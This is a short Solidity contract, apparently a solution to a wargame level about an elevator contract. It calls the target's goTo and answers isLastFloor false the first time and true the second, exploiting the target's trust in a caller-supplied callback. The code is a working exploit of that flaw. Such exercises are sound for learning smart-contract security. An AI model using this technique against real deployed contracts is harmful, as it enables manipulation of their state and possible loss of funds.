// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntEle {
    function goTo(uint256 _floor) external;
}

contract EleAttack {
    IntEle public ele;

    uint256 check = 1;

    constructor(address target) {
        ele = IntEle(target);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (check == 1) {
            check++;
            return false;
        } else {
            return true;
        }
    }

    function callGoto(uint256 floor) public {
        ele.goTo(floor);
    }
}
